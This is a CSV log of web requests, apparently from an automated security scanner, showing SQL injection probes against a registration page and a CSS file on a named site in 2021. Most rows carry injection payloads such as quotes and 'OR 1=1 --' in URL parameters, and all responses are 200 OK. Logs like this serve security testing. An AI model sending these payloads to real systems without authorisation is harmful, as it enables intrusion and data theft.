Id,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
2951,Tue Aug 31 11:25:05 WAT 2021,Tue Aug 31 11:25:07 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on,200,OK,1006,248,23023
2952,Tue Aug 31 11:25:07 WAT 2021,Tue Aug 31 11:25:07 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=%27,200,OK,242,248,23023
2953,Tue Aug 31 11:25:03 WAT 2021,Tue Aug 31 11:25:07 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1+OR+1%3D1+--+,200,OK,3829,349,347412
2954,Tue Aug 31 11:25:07 WAT 2021,Tue Aug 31 11:25:07 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on%27,200,OK,246,248,23023
2955,Tue Aug 31 11:25:07 WAT 2021,Tue Aug 31 11:25:07 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=%22,200,OK,249,248,23023
2956,Tue Aug 31 11:25:07 WAT 2021,Tue Aug 31 11:25:08 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on%22,200,OK,655,248,23023
2957,Tue Aug 31 11:25:08 WAT 2021,Tue Aug 31 11:25:09 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=%3B,200,OK,893,248,23023
2958,Tue Aug 31 11:25:07 WAT 2021,Tue Aug 31 11:25:09 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1+AND+1%3D2+--+,200,OK,2376,349,347412
2959,Tue Aug 31 11:25:09 WAT 2021,Tue Aug 31 11:25:10 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on%3B,200,OK,470,248,23023
2960,Tue Aug 31 11:25:10 WAT 2021,Tue Aug 31 11:25:10 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=%27%28,200,OK,358,248,23023
2961,Tue Aug 31 11:25:10 WAT 2021,Tue Aug 31 11:25:10 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on%27%28,200,OK,243,248,23023
2962,Tue Aug 31 11:25:09 WAT 2021,Tue Aug 31 11:25:11 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1+OR+1%3D1+--+,200,OK,1744,349,347412
2963,Tue Aug 31 11:25:10 WAT 2021,Tue Aug 31 11:25:11 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on,200,OK,1005,248,23023
2964,Tue Aug 31 11:25:11 WAT 2021,Tue Aug 31 11:25:12 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on,200,OK,353,248,23023
2965,Tue Aug 31 11:25:12 WAT 2021,Tue Aug 31 11:25:12 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on+AND+1%3D1+--+,200,OK,238,248,23023
2966,Tue Aug 31 11:25:12 WAT 2021,Tue Aug 31 11:25:12 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on+AND+1%3D2+--+,200,OK,235,248,23023
2967,Tue Aug 31 11:25:12 WAT 2021,Tue Aug 31 11:25:12 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on+OR+1%3D1+--+,200,OK,371,248,23023
2968,Tue Aug 31 11:25:12 WAT 2021,Tue Aug 31 11:25:13 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on+AND+1%3D2+--+,200,OK,370,248,23023
2969,Tue Aug 31 11:25:11 WAT 2021,Tue Aug 31 11:25:13 WAT 2021,GET,https://ibrokang.com/assets/css/now-ui-dashboard.css?v=1.0.1%27+AND+%271%27%3D%271%27+--+,200,OK,2054,349,347412
2970,Tue Aug 31 11:25:13 WAT 2021,Tue Aug 31 11:25:13 WAT 2021,GET,https://ibrokang.com/Register/Index?productSelected=3&terms=on+OR+1%3D1+--+,200,OK,241,248,23023
